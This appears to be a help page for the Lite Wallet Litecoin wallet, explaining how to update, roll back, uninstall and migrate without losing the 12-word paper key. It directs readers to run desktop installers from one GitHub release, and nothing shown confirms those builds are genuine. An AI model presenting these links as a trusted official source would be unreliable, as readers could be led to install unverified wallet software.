![Lite Wallet](assets/banner-article.png)

# Update, roll back and uninstall Lite Wallet

In-place updates, rollbacks and clean removals that keep your keys.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Updating Lite Wallet means installing the current release over the existing one; the wallet data stays in place and the paper key is unchanged. Rolling back means restoring the previous behaviour from the current release rather than keeping an old build, and uninstalling is safe only if the 12 words are written down. This page covers all three without touching the backup you already have.

## Why updating is the normal answer

A Litecoin wallet is not finished software. The chain changes, address and transaction types are added, peers upgrade, and a build that predates a change can stop syncing or fail to broadcast. Updating is not housekeeping; it is how the wallet stays able to read the network.

That is why the first reply to almost every odd behaviour is the same: install the current release from the GitHub releases page, then check whether the problem survives. It usually does not. An update is also the cheapest fix available: one download, one restart, and no data touched. The rest of this guide assumes you have tried that and want to know how to do it cleanly.

There is a second reason updating matters in a wallet specifically. Keys, addresses and history are local, while the rules that interpret them are not. A build that understands the current chain and a build that does not can hold the same keys and show different balances, which is a confusing failure because nothing was lost. Updating removes that class of problem before it starts, and it is cheaper than diagnosing it afterwards.

## How to update without losing anything

The wallet's data lives in the application's own storage, and updating replaces the application rather than the data. Your paper key is not stored in the app in a way that an update touches; it is the root of everything and it does not change.

1. Confirm your 12 words are written down and readable. Do this before anything else.
2. Close the running wallet completely.
3. Download the current release for your platform from [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
4. Run the installer or replace the portable files, keeping the data directory as it is.
5. Open the wallet and let it resume syncing.
6. Check the balance and one recent transaction to confirm the state survived.

| Platform | How an update is applied | What happens to data |
|---|---|---|
| Windows | run the new signed installer | kept in the app data directory |
| macOS | replace the app in Applications | kept in the user library |
| Linux portable | extract over the old folder | kept beside the binary |
| Linux package | install the newer package | kept in the user data path |
| iOS | App Store update | kept |
| Android | Play update, or install the newer signed APK over the old one | kept |

On Android, installing a newer APK over an existing one works only if both are signed by the same identity. A signature mismatch blocks the install, which is the correct behaviour and also the reason a repackaged build cannot silently replace the real one.

## When an update misbehaves

Sometimes the update is not the problem, and sometimes it exposes one. The useful distinction is whether the symptom existed before.

| Symptom after updating | Likely cause | What to do |
|---|---|---|
| Wallet asks to restore | data directory moved or was cleared | restore from the 12 words; see [the paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) |
| Balance zero | rescan after the update | let the scan finish |
| Sync behaves differently | new peer or scanning logic | read the new states in [the sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) |
| App will not start | platform incompatibility or a partial install | reinstall the same signed build |
| Fees look different | default rate changed | set a custom rate; see *the fees guide* |

## What "rolling back" should mean

Keeping an old build to escape a change is the wrong trade. An old build can fail against the chain, miss address formats and lose the ability to broadcast, and none of that is fixable by waiting. What people usually want when they ask to roll back is the old behaviour, not the old binary.

The better route is to fix the behaviour in the current release: set the fee rate explicitly, disable a feature you do not need, or change the connection. If a specific regression is blocking you, report it with the version and the reproduction steps - that is a bug report, not a reason to run an insecure build.

## How to uninstall safely

Uninstalling removes the application. Whether it removes the wallet depends on the platform and on whether you also delete the data.

1. Confirm the 12 words are written down and legible.
2. Send any balance you want to keep to an address you control, if you are abandoning the device.
3. Uninstall the application through the normal platform method.
4. Remove the leftover data directory only after the paper key is confirmed.
5. Keep a record of the wallet's address, so you can verify a future restore.

Uninstalling without the paper key is the one operation on this page that can destroy funds. Everything else is reversible; that is not.

## Moving to a new device

The cleanest migration is install, restore, verify, then wipe. Install the current release on the new device, restore from the 12 words, confirm the address and balance match what you expect, and only then remove the wallet from the old device. Two devices holding the same keys both work, which is convenient during a handover and a liability afterwards.

*The download verification guide* covers confirming the new build before you restore into it, and [the mobile app guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-mobile-app-android-ios.md) covers the phone side of the same migration.

## FAQ

### Do I need to uninstall before updating?

No. Installing the current release over the existing one is the normal path on every desktop platform, and it keeps your data. Uninstalling first adds risk without adding benefit.

### Does updating wipe my wallet?

No. The update replaces the application, not the wallet data, and the paper key is unchanged by it. If the wallet asks you to restore after an update, the data directory was moved or cleared rather than the update behaving normally.

### How do I go back to an older version?

You should not. Old builds fall out of step with the chain and can lose the ability to sync or broadcast. Fix the behaviour in the current release instead, and report a regression with its reproduction steps.

### Is uninstalling safe?

Only with the 12 words written down. Uninstalling removes the app and, on some platforms, its data; without the paper key the wallet cannot be restored afterwards.

### Will I lose my transaction history if I reinstall?

The history lives on the chain, and the wallet rebuilds it by scanning. A restore shows the same transactions again once the scan reaches them, though any local labels you added may not survive.

The current release, for every platform, is on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
